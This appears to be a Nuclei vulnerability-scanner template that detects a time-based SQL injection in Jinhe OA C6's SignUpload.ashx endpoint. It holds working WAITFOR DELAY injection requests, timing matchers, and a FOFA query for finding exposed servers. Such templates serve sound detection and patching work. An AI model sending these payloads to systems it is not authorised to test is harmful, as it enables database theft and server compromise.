id: jinheOA-C6-SignUpload_ashx-sql

info:
  name: 金和OA C6 SignUpload.ashx SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
    金和OA C6 SignUpload.ashx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487907&idx=1&sn=d23ca74c67a2e9f3c8958147f083d16a&chksm=c267a490f5102d863b233adc8594c3aa96473cabf0e2fb608d9eff11bf8561f5dc1b637c0b01&token=48786214&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%204%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

      - |
        GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%208%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



